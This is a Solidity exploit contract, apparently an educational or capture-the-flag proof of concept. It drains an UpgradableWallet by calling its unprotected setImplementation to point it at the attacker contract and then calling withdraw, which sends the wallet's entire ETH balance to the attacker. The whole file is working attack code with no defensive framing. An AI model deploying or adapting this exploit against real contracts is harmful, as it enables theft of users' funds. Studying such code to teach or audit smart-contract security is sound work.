// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract UpgradableWalletExploit {
    address public target;

    constructor(address _target) {
        // target is address of UpgradableWallet
        target = _target;
    }
    
    // accept ETH from UpgradableWallet
    receive() external payable {}
    
    function _call(bytes memory data) private {
        (bool executed, ) = target.call(data);
        require(executed, "failed");
    }

    function pwn() external {
        _call(abi.encodeWithSignature("setImplementation(address)", address(this)));
        _call(abi.encodeWithSignature("withdraw()"));
    }
    
    function withdraw() external {
        // this code is executed inside UpgradeableWallet
        // msg.sender = this exploit contract
        // address(this).balance = ETH balance of UpgradableWallet
        payable(msg.sender).transfer(address(this).balance);
    }
}